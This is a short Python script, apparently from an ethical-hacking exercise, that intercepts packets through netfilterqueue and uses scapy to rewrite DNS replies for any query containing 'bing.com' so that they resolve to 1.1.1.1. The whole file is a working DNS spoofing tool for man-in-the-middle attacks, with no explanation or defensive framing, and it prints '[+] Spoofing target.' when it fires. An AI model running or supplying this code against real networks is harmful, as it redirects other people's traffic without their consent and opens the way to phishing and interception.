#!/usr/bin/env python

import netfilterqueue
import scapy.packet
from scapy.all import IP


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.all.DNSRR):
        qname = scapy_packet[scapy.all.DNSQR].qname
        if b'bing.com' in qname:
            print("[+] Spoofing target.")
            answer = scapy.all.DNSRR(rrname=qname, rdata='1.1.1.1')
            scapy_packet[scapy.all.DNS].an = answer
            scapy_packet[scapy.all.DNS].ancount = 1
            
            del scapy_packet[scapy.all.IP].len
            del scapy_packet[scapy.all.IP].chksum
            del scapy_packet[scapy.all.UDP].len
            del scapy_packet[scapy.all.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

        # print(scapy_packet.show())
    # print(packet.get_payload())
    packet.accept()


if __name__ == "__main__":
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

